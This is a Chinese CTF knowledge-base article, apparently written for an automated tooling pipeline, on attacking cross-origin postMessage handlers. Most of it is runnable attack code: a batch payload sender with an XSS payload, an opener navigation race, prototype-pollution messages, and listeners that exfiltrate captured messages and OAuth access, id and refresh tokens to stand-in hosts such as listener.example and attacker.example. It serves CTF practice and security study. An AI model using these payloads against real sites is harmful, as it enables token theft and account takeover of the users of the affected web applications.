---
id: "ctf-website/07-client/postmessage"
title: "PostMessage / 跨域通信攻击"
title_en: "PostMessage / Cross-Origin Communication Attacks"
summary: >
  postMessage 题面的关键是枚举 message handler、origin/source 判断、数据 schema、回包通道和业务动作。本篇覆盖 null origin、event.source 劫持、OAuth token 泄露、prototype pollution、structured clone 侧效应、iframe/opener race，并提供 handler 探测和批量 payload 发送脚本。
summary_en: >
  postMessage challenges revolve around message handlers, origin/source checks, data schema, reply channels, and privileged actions. Covers null origin, event.source hijacking, OAuth token leakage, prototype pollution, structured clone side effects, iframe/opener races, and runnable handler/probe scripts.
board: "ctf-website"
category: "07-client"
signals: ["postMessage", "跨域通信", "null origin", "OAuth token", "prototype pollution", "event.source", "structured clone", "iframe"]
mcp_tools: ["http_probe", "kb_router", "jshook"]
keywords: ["postMessage", "跨域通信", "null origin绕过", "OAuth token窃取", "prototype pollution", "structured clone", "event.source劫持"]
difficulty: "advanced"
tags: ["client-side", "oauth", "xss", "ctf", "browser"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["ctf-website/07-client/admin-bot-xss", "ctf-website/20-oauth-deep/01-oauth-attack-chains"]
---
# PostMessage / 跨域通信攻击

postMessage 攻击不是盲发 JSON，而是还原接收端的四件事：谁能发、发什么 schema、触发什么动作、响应发给谁。

## 输入信号

| 信号 | 立即动作 | 命中样本 | 失败样本 |
|---|---|---|---|
| JS 中有 `addEventListener("message"` | 抽 handler、origin 检查和 data 分支 | 可控 origin/data 进入敏感分支 | handler 只记录日志 |
| `postMessage(..., "*")` | 找 token/flag/redirect 回包 | opener/iframe 收到敏感数据 | 回包只有 public 状态 |
| 检查 `event.origin.includes/endsWith` | 构造 sibling/eTLD/null origin | 非目标 origin 通过 | 精确等值匹配 |
| 检查 `event.source` | opener/iframe 导航 race | source 引用保留但内容被替换 | 每次重新验证 origin |
| data 进入 merge/render/eval | schema fuzz + PP/XSS | `isAdmin`、redirect、HTML sink 被污染 | schema validator 拒绝 |

## 工作流

```text
定位 message handler
  → 抽 origin/source/schema/action
  → 建立 iframe/opener harness
  → 批量发送 origin 与 data 变体
  → 捕获回包、DOM 变化、网络请求
  → 按命中动作转 OAuth/JWT/XSS/PP 链
```

## 0. 判定矩阵

| 检查方式 | Payload | 命中样本 | 失败样本 |
|---|---|---|---|
| `origin === trusted` | 子域、协议降级、punycode | 非 trusted 进入 handler | 固定拒绝 |
| `origin.includes("target.com")` | `https://target.com.attacker.test` | 通过 includes | 使用 URL parser |
| `origin === "null"` 或未处理 null | sandbox iframe / data URL | null origin 可执行动作 | null 被拒 |
| `source === iframe.contentWindow` | 导航 iframe 到 attacker | source 仍通过 | 导航后重新绑定 |
| `data.type/action` | admin/getFlag/token/export | 返回敏感字段 | 只返回 ack |
| deep merge | `__proto__`, `constructor.prototype` | 全局对象被污染 | structured clone 后被净化或 schema 拒绝 |

## 1. Handler 提取

```javascript
(() => {
  const oldAdd = EventTarget.prototype.addEventListener;
  EventTarget.prototype.addEventListener = function(type, fn, opts) {
    if (type === "message") {
      console.log("[pm-handler]", location.href, fn && fn.toString().slice(0, 1200));
      debugger;
    }
    return oldAdd.call(this, type, fn, opts);
  };
  window.addEventListener("message", e => {
    console.log("[pm-observe]", {
      origin: e.origin,
      source: !!e.source,
      data: e.data
    });
  }, true);
})();
```

成功样本：console 里出现 handler 源码、分支关键字、`postMessage` 回包。失败样本：页面无 handler 或 handler 延迟加载，需要导航后再注入 hook。

## 2. 批量 payload 发送器

```html
<!doctype html>
<meta charset="utf-8">
<iframe id="t" src="https://target.example/page.html"></iframe>
<script>
const payloads = [
  {type: "ping"},
  {type: "getFlag"},
  {type: "admin", cmd: "export"},
  {action: "oauth", access_token: "probe"},
  {"__proto__": {isAdmin: true}},
  {constructor: {prototype: {role: "admin"}}},
  {type: "render", html: "<img src=x onerror=fetch('/flag').then(r=>r.text()).then(t=>parent.postMessage({leak:t},'*'))>"}
];
window.addEventListener("message", e => {
  fetch("https://listener.example/pm", {
    method: "POST",
    mode: "no-cors",
    body: JSON.stringify({origin: e.origin, data: e.data})
  });
});
t.onload = () => {
  for (const p of payloads) {
    t.contentWindow.postMessage(p, "*");
  }
};
</script>
```

## 3. null origin 与 source race

```html
<iframe sandbox="allow-scripts allow-forms allow-popups" srcdoc="
<script>
parent.postMessage({type:'getFlag', reply:'parent'}, '*');
</script>
"></iframe>
```

```html
<script>
const w = window.open("https://target.example/trusted.html");
setTimeout(() => { w.location = "https://attacker.example/relay.html"; }, 800);
setTimeout(() => { w.postMessage({type:"export", target:"admin"}, "*"); }, 1600);
window.addEventListener("message", e => {
  navigator.sendBeacon("https://listener.example/source", JSON.stringify({origin:e.origin, data:e.data}));
});
</script>
```

判定：如果 handler 只保存 `source` 引用，导航后仍可能被当作 trusted window；如果每次同时校验 `origin` 与 action schema，这条线通常终止。

## 4. OAuth / token 回包

| 场景 | 动作 | 成功样本 |
|---|---|---|
| callback 页面 `opener.postMessage(token, "*")` | attacker opener 接收 | access_token/id_token 到达 listener |
| iframe silent refresh | 嵌入 OAuth iframe，监听回包 | refresh 结果外带 |
| redirect proxy | 改 `redirect_uri/state` 与 opener | code/token 发给 attacker window |

```javascript
window.addEventListener("message", e => {
  if (JSON.stringify(e.data).match(/access_token|id_token|refresh_token|code/)) {
    fetch("https://listener.example/oauth", {method:"POST", mode:"no-cors", body:JSON.stringify({origin:e.origin, data:e.data})});
  }
});
```

## 5. structured clone 与 PP

```javascript
const evil = /flag/g;
evil.lastIndex = 999999;
target.postMessage({type:"validate", pattern: evil}, "*");
target.postMessage({"__proto__": {isAdmin: true, apiBase: "/admin"}}, "*");
target.postMessage({constructor: {prototype: {role: "admin"}}}, "*");
```

成功样本：接收端正则结果、全局 config、权限字段或 DOM 渲染发生变化。失败样本：`structuredClone` 后字段被 schema 校验剔除，或 action 白名单不含敏感动作。

## 攻击链

```text
handler 定位
  → origin/source/schema 差分
  → null origin / source race / wildcard 回包
  → token 或敏感动作命中
  → 转 OAuth/JWT/XSS/PP 下一跳
```

## Evidence

| 项 | 记录内容 |
|---|---|
| handler | 文件 URL、函数片段、origin/source 检查、action 分支 |
| harness | iframe/opener/null-origin 构造、发送 payload、目标 URL |
| oracle | 回包 data、DOM 变化、网络请求、listener 日志 |
| 成功样本 | token/flag/admin 数据回包，或敏感 action 被执行 |
| 失败样本 | origin 精确拒绝、schema reject、source mismatch、同一 ack |
| 下一跳 | OAuth token 转 `20-oauth-deep`；JWT 转 `02-auth/jwt`；HTML sink 转 admin-bot-xss |

## MCP 工具映射

| 步骤 | MCP 工具 | 说明 |
|---|---|---|
| handler 探测 | `jshook` | hook addEventListener/postMessage |
| 页面探测 | `http_probe` | 抓 JS bundle 与 iframe/opener 页面 |
| 知识路由 | `kb_router` | 按 postMessage、OAuth token、prototype pollution 搜索 |
